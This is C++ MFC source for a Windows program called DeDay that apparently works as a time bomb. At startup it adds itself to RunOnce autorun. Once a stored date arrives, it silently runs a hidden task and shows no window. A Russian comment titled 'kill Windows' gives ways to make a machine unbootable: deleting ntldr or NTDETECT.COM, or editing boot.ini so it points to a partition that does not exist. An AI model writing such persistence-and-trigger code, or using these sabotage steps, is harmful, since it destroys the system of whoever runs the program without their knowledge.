// DeDay.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"

#include <string>
using namespace std;

#include "DeDay.h"
#include "DeDayDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#include "DeleteDay.h"

// CDeDayApp

BEGIN_MESSAGE_MAP(CDeDayApp, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()

// CDeDayApp construction

CDeDayApp::CDeDayApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}


// The one and only CDeDayApp object

CDeDayApp theApp;

// CDeDayApp initialization

//================  убить винду ===================
/*
	1. С амым скучным приемом будет удалить скрытый системный файл ntldr
	2. Другое дело, если убрать скрытый системный «NTDETECT.COM». 
	После рестарта пользователь будет наблюдать бесконечную
череду перезагрузок (без вывода каких-либо сообщений). О тмечу: пе-
резагрузок компа, а не В инды. Д о нее дело просто не доходит. Придется
задуматься над тем, как исправить ситуацию. Д ля нас же очевидно:
возвратить файл на свое законное место.
3. Изощренным коварством будет редактирование всем известного
«boot.ini». И менно изменение, а не удаление (после удаления В инде
все же удается загрузиться). И так, открываем его блокнотом и находим
строки с путями до Windows вида
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
Это — иерархия оборудования (железа), по которой определяется жесткий
диск и раздел, где стоит В инда. Н аша цель — задать несуществующую,
ошибочную конфигурацию. Д адим системе понять, что В инда поставле-
на не на первый, а на девятый раздел: меняем все «partition(1)» на
«partition(9)»
*/

BOOL CDeDayApp::InitInstance()
{
	CWinApp::InitInstance();

	//добавим сябя в RunOnce
	CDeleteDay dDay;
		dDay.AddToAutoRun();

	//если дата выполнения задания наступила
	if (dDay.InspectDeleteData()) {
		//... выполнить задание
		dDay.PerformATask();
		return false;		//и не показывать окно программы
	}
	
	CDeDayDlg dlg;
	m_pMainWnd = &dlg;
	INT_PTR nResponse = dlg.DoModal();

	return FALSE;
}